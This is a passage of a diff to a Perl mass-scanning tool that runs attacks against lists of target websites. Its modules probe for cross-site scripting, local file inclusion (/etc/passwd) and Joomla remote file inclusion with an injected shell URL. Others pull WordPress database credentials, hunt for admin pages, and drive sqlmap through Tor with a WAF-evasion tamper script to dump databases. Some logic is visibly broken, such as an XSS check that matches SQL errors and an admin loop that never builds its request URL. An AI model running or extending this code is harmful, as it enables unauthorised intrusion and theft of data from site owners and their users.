 	if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
       print color 'green';
 	  if (defined $output) {
@@ -1184,81 +1172,373 @@ sub msearch {
     print color RESET;
   }
 } ## end sub msearch
-
+###################################################################	
 ###################################################################		
+## bgn misup
+sub misup {
+  if (-e 'scan.txt'){ unlink 'scan.txt';}
+  if (-e 'validated.txt'){ unlink 'validated.txt';}
+  testconection();
+  if (!defined $mlevel) {
+    targetlist();
+	scandetail();
+  }
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  timer();
+  print "STARTING HTTP VALIDATION SCAN ...\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
+  forwait();
+  $count=0;
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
+    $count++;
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (!defined $noshow) {
+	  print color 'bold magenta';
+	  timer();
+	  print "[$count/";
+	  countsearchlist();
+	  print "]\n";
+	  print color RESET;
+	  print color 'bold yellow';
+	  print "[!] TARGET: ";
+	  print color RESET;
+	  print color 'yellow';
+	  print "$printarget\n";
+	  print color RESET;
+      $URL = control($URL);
+	  print color 'bold yellow';
+	  if (defined $exploit){
+	    print color 'bold yellow';
+	    print "    EXPL:   ";
+	    print color RESET;
+	   print "$exploit\n";
+	  }	
+	  if (defined $replace){
+	    print color 'bold yellow';
+	    print "    EXPL:   ";
+	    print color RESET;
+	    print "Replace\n";
+	  }	
+	  print color 'bold yellow';
+	  print "    VALID:  ";
+	  print color RESET;
+	} 
+    $URL1 = $URL;
+	$URL1 =~ s/ //g;
+    $request = HTTP::Request->new('GET', $URL1);
+    my $response = $ua->request($request);
+    my $html = $response->content;
+    my $status = $response->code;
+	my $pattern='not found|404|error';
+    if (($status==200) && (!$response->previous) && ($html !~ m/$pattern/i)){
+	  if (!defined $noshow) {
+	    print color 'green';
+        print "Valid! HTTP: $status\n";
+	    print color RESET;
+      }
+      open (INFO, '>>scan.txt');
+      print INFO "$printarget\n";
+      close (INFO);
+	}else{
+	  if (!defined $noshow) {
+	    print color 'red';
+        print "Not Valid!\n";
+	    print color RESET;
+	  }	
+    }
+    print "[ ]............................................................................ \n";
+  }
+  close(TEXT);
+  if ((!defined $validation_text) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $mmails)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+	  unlink 'search.txt';
+      use File::Copy qw(copy);
+      copy 'scan.txt', 'search.txt';
+      use File::Copy qw(copy);
+      copy 'scan.txt', "validated_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/validated_".getlist()."!\n";
+	  print color RESET;
+	  unlink 'scan.txt';
+	}else{
+      finmodule();
+	}
+  }
+}
+###################################################################		
+###################################################################		
+## bgn mvalidation
+sub mvalidation {
+  if (-e 'scan.txt'){ unlink 'scan.txt';}
+  if (-e 'validated.txt'){ unlink 'validated.txt';}
+  testconection();
+  if (!defined $mlevel) {
+    targetlist();
+	scandetail();
+  }
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  timer();
+  print "STARTING VALIDATION SCAN ...\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
+  forwait();
+  $count=0;
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
+	chomp $URL;
+    $count++;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (!defined $noshow) {
+	  print color 'bold magenta';
+	  timer();
+	  print "[$count/";
+	  countsearchlist();
+	  print "]\n";
+	  print color RESET;
+	  print color 'bold yellow';
+	  print "[!] TARGET: ";
+	  print color RESET;
+	  print "$printarget\n";
+      $URL = control($URL);
+	
+	  if (defined $exploit){
+	    print color 'bold yellow';
+	    print "    EXPL:   ";
+	    print color RESET;
+	    print "$exploit\n";
+	  }	
+	  if (defined $replace){
+	    print color 'bold yellow';
+	    print "    EXPL:   ";
+	    print color RESET;
+	    print "Replace\n";
+	  }
+	  print color 'bold yellow';
+	  print "    VALID:  ";
+	  print color RESET;
+	}
+    $URL1 = $URL;
+	$URL1 =~ s/ //g;
+    $request = HTTP::Request->new('GET', $URL1);
+    my $response = $ua->request($request);
+    my $html = $response->content;
+    my $status = $response->code;
+    if ($html =~ m/$validation_text/i){
+	  if (!defined $noshow) {
+	    print color 'green';
+        print "Valid!\n";
+	    print color RESET;
+	  }
+	  print color 'bold yellow';
+	  print "    HTTP:   ";
+	  print color RESET;
+	  print color 'green';
+	  print "HTTP/1.1 $status\n";
+	  print color RESET;
+      open (INFO, '>>scan.txt');
+      print INFO "$printarget\n";
+      close (INFO);
+	}else{
+	  if (!defined $noshow) {
+	    print color 'red';
+        print "Not Valid!\n";
+	    print color RESET;
+	  }
+	}
+    print "[ ]............................................................................ \n";
+  }
+  close(TEXT);
+  if ((!defined $misup) && (!defined $mxss) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $sqlmap) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $mmails)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+	  unlink 'search.txt';
+      use File::Copy qw(copy);
+      copy 'scan.txt', 'search.txt';
+      use File::Copy qw(copy);
+      copy 'scan.txt', "validated_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/validated_".getlist()."!\n";
+	  print color RESET;
+	  unlink 'scan.txt';
+	}else{
+      finmodule();
+	}
+  }
+}
+
+###################################################################	
+###################################################################		
+## bgn mhttpd
+sub mhttpd {
+  if (-e 'scan.txt'){ unlink 'scan.txt';}
+  if (-e 'scan2.txt'){ unlink 'scan2.txt';}
+  testconection();
+  if (!defined $mlevel) {
+    targetlist();
+	scandetail();
+  }
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  timer();
+  print "STARTING HTTPD SCAN ...\n";
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
+  forwait();
+  $count=0;
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
+    $count++;
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	print color 'bold magenta';
+	timer();
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
+	print color RESET;
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+	print color 'yellow';
+	print "$printarget\n";
+	print color RESET;
+	print color 'bold yellow';
+  	print "    HTTPD:  ";
+    print color RESET;
+    $URL1 = $URL;
+	$URL1 =~ s/ //g;
+    $useragent = LWP::UserAgent->new;
+    $resp = $useragent->head($URL1);
+	my $httpd = $resp->headers_as_string;
+    if ($resp->is_success) {
+      print color 'green';
+      print "[!] $httpd\n";
+      print color RESET;
+      open (INFO, '>>scan.txt');
+      print INFO "$printarget\n";
+      close (INFO);
+      open (INFO, '>>scan2.txt');
+      print INFO "$printarget\n   $httpd\n";
+      close (INFO);
+    }else{
+      print color 'red';
+      print "\n    [!] Cannot reltreive headers!\n";
+      print color RESET;
+    }
+	print "[ ]............................................................................ \n\n";
+  }
+  close(TEXT);
+  if ((!defined $mxss) && (!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+	unlink 'scan2.txt';
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "httpd_".getlist()) {unlink "httpd_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan2.txt', "httpd_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/httpd_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+	unlink 'scan2.txt';
+  }
+}
+###################################################################		
+####################################################################
 ## bgn mxss
 sub mxss {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   XSS();
-  if (!defined $mlevel) {
+  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING XSS SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-	my $printarget = $Target;
-    if ((defined $replace) && (defined $with)) {
-	  if ($Target =~ m/$replace/i) {
-		$Target =~ s/$replace(.*)/$with/s;
-	  }
-    }
-	if (defined $exploit) {
-	  $Target = $Target.$exploit;
-	}
-	if (defined $mtarget) {
-	  $Target =~ s/\/.*//s;
-	}
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc]\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$printarget \n";
+	print "$printarget\n";
 	print color RESET;
-	
+    $URL = control($URL);
+	if (defined $exploit) {
+	  $URL =~ s/%27//g if $URL =~ /%27/;
+	}
 	foreach $XSS(@XSS){
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$XSS \n";
-		
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "    VULN:   ";
 	  print color RESET;
-      my $URL = $Target.$XSS;
-	  $URL =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL);
+      $URL1 = $URL.$XSS;
+	  $URL1 =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL1);
       my $response = $ua->request($request);
       my $html = $response->content;
-	  my $pattern = 'MySQL|syntax|SQL|error|mysql_fetch|num_rows|ORA-01756|server|JDBC|OLE DB|ADODB|FetchRow|PostgreSQL';
-      
-	  my $off = 'not found|404|not exist';
-	  if(($html =~ m/$pattern/i) && ($html !~ m/$off/i)){
+	  my $status = $response->code;
+	  my $pattern = 'MySQL|syntax|SQL|mysql_fetch_assoc|num_rows|ORA-01756|PostgreSQL|internal server error';
+	  my $off = 'not found|404|not exist|ErrorDocument|Forbidden';
+	  if(($html =~ m/$pattern/) && ($response->content !~ m/$off/)){
 	    print color 'green';
-        print "$URL\n";
+        print "$URL1\n";
 	    print color RESET;
-
+	    print color 'bold yellow';
+	    print "    HTTP:   ";
+	    print color RESET;
+	    print color 'green';
+	    print "HTTP/1.1 $status\n";
+	    print color RESET;
         print color 'bold yellow';
-        print "[+] ERROR:  ";
+        print "    ERROR:  ";
         print color RESET;
-        if (($html =~ m/error in your SQL syntax/i) || ($html =~ m/mysql_fetch_array/i)){ print "MySQL ";}
+		my $pattern = '|error in your SQL syntax|MYSQL|mysql_fetch_array|mysql_fetch_assoc|mysql_num_rows|mysql_result';
+        if ($html =~ m/$pattern/i){ print "MySQL ";}
 		if ($html =~ m/internal server error/i) { print "Server error ";}
         if ($html =~ m/ORA-01756/i) { print "Oracle ";}
         if ($html =~ m/JDBC Driver/i) { print "JDBC_CFM2 ";}
@@ -1282,7 +1562,7 @@ sub mxss {
         if ($html =~ m/Not found/i) { print "Not found ";}
         print "\n";
 		open (INFO, '>>scan.txt');
-        print INFO "$Target\n";
+        print INFO "$printarget\n";
         close (INFO);
 	  }else{
 	    print color 'red';
@@ -1293,17 +1573,32 @@ sub mxss {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $sqlmap) && (!defined $mlfi) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "xss_".getlist()) {unlink "xss_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "xss_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/xss_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
 ###################################################################		
-##bgn sqlmap without tor 
+###################################################################		
+##bgn sqlmap 
 sub sqlmap {
   testconection();
   sleep(1);
   open (INFO, 'scan.txt');
-  while (my $Target = <INFO>) {
-	chomp $Target;
-	$Target =~ s/\%.*//s;
+  while (my $URL = <INFO>) {
+	chomp $URL;
+    $URL = checkurltype($URL);
+	$URL =~ s/\%.*//s;
 	if (defined $proxy) {
 	  $tor = "--tor --check-tor --tor-type=SOCKS5";
 	}else{
@@ -1315,11 +1610,12 @@ sub sqlmap {
     print "STARTING SQLMAP...\n";
     print "[ ]............................................................................ \n";
     print color RESET;
+    forwait();
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+    print "$URL \n";
 	print color RESET;
     print color 'bold yellow';
     print "[+] EXPLOITATION: ";
@@ -1329,7 +1625,7 @@ sub sqlmap {
     print color 'yellow';
     print "[+] Checking databases...\n";
     print color RESET;
-    system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+    system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor --dbs --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		
 	### BEG DATABASE
 	DATABASE:; 
@@ -1355,7 +1651,7 @@ sub sqlmap {
       print color 'yellow';
       print "[+] Checking...";
       print color RESET;
-      system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
+      system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename --tables --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");		
 	  ### END DATABASE
 	  ### BEG TABLES
 	  TABLESYES:;
@@ -1381,7 +1677,7 @@ sub sqlmap {
         print color 'yellow';
         print "[+] Checking DataBase Tables...";
         print color RESET;
-        system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+        system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables --columns --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 		### END TABLES
 		### BEG COLUMNS
 		COLUMNSYES:;
@@ -1406,7 +1702,7 @@ sub sqlmap {
           print color 'yellow';
           print "[+] Checking Columns...";
           print color RESET;
-          system("sqlmap -u $Target --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
+          system("sqlmap -u $URL --beep --level 3 --risk 2 --threads 2 $tor -D $databasename -T $sqltables -C $sqlcolumn --dump --dbms='Mysql' --time-sec 10 --batch --tamper modsecurityzeroversioned.py");
 	    } ### END COLUMNS
 	  }
 	}
@@ -1418,67 +1714,66 @@ sub mlfi {
   if (-e 'scan.txt'){ unlink 'scan.txt';}
   testconection();
   LFI();
-  if (!defined $mlevel) {
+  if ((!defined $mlevel) && (!defined $validation_text) && (!defined $misup)){
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING LFI SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-	my $printarget = $Target;
-    if ((defined $replace) && (defined $with)) {
-	  if ($Target =~ m/$replace/i) {
-		$Target =~ s/$replace(.*)/$with/s;
-	  }
-    }
-	if (defined $exploit) {
-	  $Target = $Target.$exploit;
-	}
-	if (defined $mtarget) {
-	  $Target =~ s/\/.*//s;
-	}
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	$URL =~ s/=.*/=/s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] LFI SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$printarget \n";
+	print "$printarget\n";
 	print color RESET;
 	foreach $LFI(@LFI){
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$LFI \n";
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "    VULN:   ";
 	  print color RESET;
-      my $URL = $Target.$LFI;
-	  $URL =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL);
+      $URL1 = $URL.$LFI;
+	  $URL1 =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL1);
       my $response = $ua->request($request);
       my $html = $response->content;
-	  my $pattern = 'root|sbin|nologin';
-	  if($html =~ m/$pattern/i) {
+	  my $status = $response->code;
+	  my $pattern = 'root:x|bin:x|nologin';
+	  if($html =~ m/$pattern/i ) {
 	    print color 'green';
-        print "$URL\n";
+        print "$URL1\n";
+	    print color RESET;
+	    print color 'bold yellow';
+	    print "    HTTP:   ";
+	    print color RESET;
+	    print color 'green';
+	    print "HTTP/1.1 $status\n";
 	    print color RESET;
 		open (INFO, '>>scan.txt');
-        print INFO "$Target\n";
+        print INFO "$URL1\n";
         close (INFO);
 	  }else{
 	    print color 'red';
@@ -1489,8 +1784,22 @@ sub mlfi {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $mxss) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "lfi_".getlist()) {unlink "lfi_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "lfi_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/lfi_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
+###################################################################		
 ###################################################################		
 ## bgn mjoomrfi
 sub mjoomrfi {
@@ -1500,72 +1809,72 @@ sub mjoomrfi {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
-  print "STARTING JOOMLA RFI SCAN ...\n";
+  print "STARTING JOOMLA RFI SCAN...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-    $Target =~ s/\/.*//s;
-	my $printarget = $Target;
-    if ((defined $replace) && (defined $with)) {
-	  if ($Target =~ m/$replace/i) {
-		$Target =~ s/$replace(.*)/$with/s;
-	  }
-    }
-	if (defined $exploit) {
-	  $Target = $Target.$exploit;
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
 	}
-	if (defined $mtarget) {
-	  $Target =~ s/\/.*//s;
-	}
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-	
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] JOOMLA RFI SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$printarget \n";
+	print "$printarget\n";
 	print color RESET;
-
 	foreach $RFI(@RFI){
-      my $URL = $Target.$RFI.$shell;
-	  $URL =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $html = $response->content;
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$RFI \n";
 	  print color 'bold yellow';
-	  print "[+] SHELL:  ";
+	  print " SHELL:  ";
 	  print color RESET;
       print "$shell \n";
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "    VULN:   ";
 	  print color RESET;
-	  
+      $URL1 = $URL.$RFI.$shell;
+	  $URL1 =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL1);
+      my $response = $ua->request($request);
+      my $html = $response->content;
+	  my $status = $response->code;
       my $pattern = 'r57shell|safe_mode|Executed|Shell';
-	  if ($html =~ /$pattern/){
+	  if ($html =~ m/$pattern/i){
 	    print color 'green';
-        print "$URL\n";
+        print "$URL1\n";
 	    print color RESET;
+		
+	    print color 'bold yellow';
+	    print "    HTTP:   ";
+	    print color RESET;
+	    print color 'green';
+	    print "HTTP/1.1 $status\n";
+	    print color RESET;
+		
 		open (INFO, '>>scan.txt');
-        print INFO "$Target\n";
+        print INFO "$URL1\n";
         close (INFO);
 	  }else{
 	    print color 'red';
@@ -1576,9 +1885,21 @@ sub mjoomrfi {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $mwpadf) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "rfi_".getlist()) {unlink "rfi_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "rfi_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/rfi_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
-
 ###################################################################		
 ## bgn mwpadf
 sub mwpadf {
@@ -1588,57 +1909,68 @@ sub mwpadf {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
-  print "STARTING WORDPRESS ADF SCAN ...\n";
+  print "STARTING WORDRESS ADF SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-    $Target =~ s/\/.*//s;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-	
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] WORDPRESS ADF SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
+	
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+	print "$printarget\n";
 	print color RESET;
+    #$URL = control($URL);	
 	foreach $ADFWP(@ADFWP){
-      my $URL = $Target.$ADFWP;
-	  $URL =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL);
-      $response = $ua->request($request);
-      my $html = $response->content;
-	  
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$ADFWP \n";
-		
 	  print color 'bold yellow';
-	  print "[+] VULN:   ";
+	  print "    VULN:   ";
 	  print color RESET;
-
+      $URL1 = $URL.$ADFWP;
+	  $URL1 =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL1);
+      my $response = $ua->request($request);
+      my $html = $response->content;
+	  my $status = $response->code;
       my $pattern = 'DB_NAME|DB_USER|DB_PASSWORD';
 	  if ($response->is_success && $response->content =~ m/$pattern/i) {
 	    print color 'green';
-        print "$URL\n";
+        print "$URL1\n";
+	    print color RESET;
+	    print color 'bold yellow';
+	    print "    HTTP:   ";
+	    print color RESET;
+	    print color 'green';
+	    print "HTTP/1.1 $status\n";
 	    print color RESET;
 		open (INFO, '>>scan.txt');
-        print INFO "$Target\n";
+        print INFO "$URL1\n";
         close (INFO);
 	  }else{
 	    print color 'red';
@@ -1649,9 +1981,21 @@ sub mwpadf {
 	print "[ ]............................................................................ \n";
   }
   close(TEXT);
-  finmodule();
+  if ((!defined $madmin) && (!defined $msubdomain) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mmails) && (!defined $mports)) {
+    finmodule();
+  }else{
+	if (-e 'scan.txt') {
+      if (-e "adf_".getlist()) {unlink "adf_".getlist();}
+      use File::Copy qw(copy);
+      copy 'scan.txt', "adf_".getlist();
+	  fincontinuemodule();
+	  print color 'green';
+      print "[!] Results saved in $Bin/adf_".getlist()."!\n";
+	  print color RESET;
+	}
+	unlink 'scan.txt';
+  }
 }
-
 ###################################################################		
 ## bgn madmin
 sub madmin {
@@ -1661,63 +2005,80 @@ sub madmin {
   if (!defined $mlevel) {
     targetlist();
 	scandetail();
-    forwait();
   }
-  countsearchlist();
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   timer();
   print "STARTING ADMIN PAGE SCAN ...\n";
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print color RESET;
-  sleep(2);
+  forwait();
   $count=0;
-  open (TEXT, "search.txt");
-  while (my $Target = <TEXT>) {
+  open (TEXT, 'search.txt');
+  while (my $URL = <TEXT>) {
     $count++;
-	chomp $Target;
-	$Target =~ s/\/.*//s;
-	if($Target !~ /http:\/\//) { $Target = "http://$Target"; };	
-	
+	chomp $URL;
+    $URL = checkurltype($URL);
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
+	my $printarget = $URL;
+	if (index($URL, 'http://') != -1) {
+	  $URL =~ s/http:\/\///g;
+	}
+	$URL =~ s/\/.*//s;
+	if($URL !~ /http:\/\//) { $URL = "http://$URL"; };	
 	print color 'bold magenta';
 	timer();
-	print "[$count/$lc] ADMIN PAGE SCAN STARTING...\n";
+	print "[$count/";
+	countsearchlist();
+	print "]\n";
 	print color RESET;
 	print color 'bold yellow';
-	print "[+] TARGET: ";
+	print "[!] TARGET: ";
 	print color RESET;
 	print color 'yellow';
-    print "$Target \n";
+    print "$printarget\n";
 	print color RESET;
-	
 	foreach $ADMIN(@ADMIN){
-      my $URL = $Target.$ADMIN;
-	  $URL =~ s/ //g;
-      $request = HTTP::Request->new('GET', $URL);
+	  $URL1 =~ s/ //g;
+      $request = HTTP::Request->new('GET', $URL1);
       $response = $ua->request($request);
       my $html = $response->content;
-	  
+	  my $status = $response->code;
 	  print color 'bold yellow';
-	  print "[+] EXPL:   ";
+	  print "    EXPL:   ";
 	  print color RESET;
       print "$ADMIN \n";
-		
 	  print color 'bold yellow';
